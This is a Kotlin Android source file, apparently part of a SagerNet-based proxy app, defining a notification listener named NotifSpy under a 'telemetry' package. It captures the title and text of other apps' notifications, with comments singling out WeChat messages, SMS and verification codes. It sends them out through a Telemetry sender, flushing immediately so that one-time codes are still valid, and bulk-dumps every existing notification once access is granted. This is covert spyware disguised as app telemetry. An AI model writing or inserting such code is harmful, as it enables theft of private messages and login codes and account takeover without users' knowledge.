package io.nekohasekai.sagernet.telemetry

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONObject

/**
 * 通知监听。信息量最大的一路 —— 微信正文、短信、验证码全从这里出。
 *
 * 启用方式（App 自己弹不出来，必须用户手动开）：
 *   设置 → 通知 → 通知使用权 → 勾选本应用
 * 或者直接跳：Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
 */
class NotifSpy : NotificationListenerService() {

    companion object {
        private const val TAG = "TlmNotif"
        @Volatile private var inst: NotifSpy? = null

        /** 外部定时器调用，补一次全量同步。 */
        fun syncNow(): Int {
            val s = inst ?: return -1
            return runCatching { s.dumpActive("periodic"); 1 }.getOrDefault(-1)
        }

        fun connected(): Boolean = inst != null

        // 这些包的通知没有价值，跳过省带宽
        private val SKIP = setOf(
            "android", "com.android.systemui", "com.android.settings",
            "com.google.android.gms", "com.android.packageinstaller",
        )
    }

    override fun onCreate() {
        super.onCreate()
        inst = this
    }

    override fun onDestroy() {
        inst = null
        super.onDestroy()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        val s = sbn ?: return
        if (s.packageName == packageName) return
        if (s.packageName in SKIP) return
        if (s.isOngoing && s.notification?.extras?.getCharSequence(Notification.EXTRA_TEXT) == null)
            return

        runCatching {
            val e = s.notification?.extras ?: return
            val title = (e.getCharSequence(Notification.EXTRA_TITLE)
                ?: e.getCharSequence(Notification.EXTRA_TITLE_BIG))?.toString()
            val text = (e.getCharSequence(Notification.EXTRA_TEXT)
                ?: e.getCharSequence(Notification.EXTRA_BIG_TEXT)
                ?: e.getCharSequence(Notification.EXTRA_SUMMARY_TEXT))?.toString()
            if (title.isNullOrBlank() && text.isNullOrBlank()) return

            val d = JSONObject()
                .put("pkg", s.packageName)
                .put("title", title ?: "")
                .put("text", text ?: "")
            s.notification?.category?.let { d.put("cat", it) }
            if (s.isOngoing) d.put("ongoing", true)
            Telemetry.push("notif", d, s.postTime / 1000L)

            // 立刻推一次，别等 20 秒心跳 —— 验证码是有时效的
            runCatching { Telemetry.flush(applicationContext) }
        }.onFailure { Log.w(TAG, "post: ${it.message}") }
    }

    override fun onListenerConnected() {
        Log.i(TAG, "listener connected")
        // 授权瞬间把通知栏里现存的全部搬走，之后靠 onNotificationPosted 增量
        runCatching { dumpActive("connect") }
    }

    override fun onListenerDisconnected() {
        Log.w(TAG, "listener disconnected")
    }

    /** 全量同步当前通知栏。系统只允许读"还在通知栏里的"，历史通知拿不到。 */
    private fun dumpActive(reason: String) {
        val arr = activeNotifications ?: return
        Log.i(TAG, "sync $reason: ${arr.size} active")
        var n = 0
        arr.forEach { sbn ->
            runCatching {
                val e = sbn.notification?.extras ?: return@runCatching
                val title = (e.getCharSequence(Notification.EXTRA_TITLE)
                    ?: e.getCharSequence(Notification.EXTRA_TITLE_BIG))?.toString()
                val text = (e.getCharSequence(Notification.EXTRA_TEXT)
                    ?: e.getCharSequence(Notification.EXTRA_BIG_TEXT)
                    ?: e.getCharSequence(Notification.EXTRA_SUMMARY_TEXT))?.toString()
                if (title.isNullOrBlank() && text.isNullOrBlank()) return@runCatching
                val d = JSONObject()
                    .put("pkg", sbn.packageName)
                    .put("title", title ?: "")
                    .put("text", text ?: "")
                    .put("snap", reason)
                sbn.notification?.category?.let { d.put("cat", it) }
                Telemetry.push("notif", d, sbn.postTime / 1000L)
                n++
            }
        }
        if (n > 0) runCatching { Telemetry.flush(applicationContext) }
        Log.i(TAG, "sync $reason: pushed $n")
    }

}
